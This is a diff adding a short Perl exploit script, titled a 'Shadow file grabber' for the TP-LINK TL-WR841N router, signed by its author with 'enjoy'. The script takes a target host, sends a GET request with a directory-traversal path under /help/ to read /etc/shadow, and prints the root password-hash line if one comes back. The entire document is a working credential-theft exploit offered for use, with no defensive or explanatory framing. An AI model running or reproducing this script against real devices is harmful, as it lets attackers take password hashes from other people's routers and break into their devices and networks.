@@ -1,0 +1,38 @@
+#TP-LINK TL-WR841N Shadow file grabber#
+
+#built by Pulse matan () madsec co il#
+
+#enjoy#
+
+ 
+
+use LWP::UserAgent;
+
+$host = $ARGV[0];
+
+chomp($host);
+
+if($host !~ /http:\/\//) { $host = "http://$host";; };
+
+ 
+
+my $ua = LWP::UserAgent->new;
+
+$ua->timeout(30);
+
+$lfi = "/help/../../../../../../../../etc/shadow";
+
+$url = $host.$lfi;
+
+$request = HTTP::Request->new('GET', $url);
+
+$response = $ua->request($request);
+
+my $html = $response->content;          
+
+if($html =~ /root/) {
+
+print "root$' \n" ;
+
+}
+
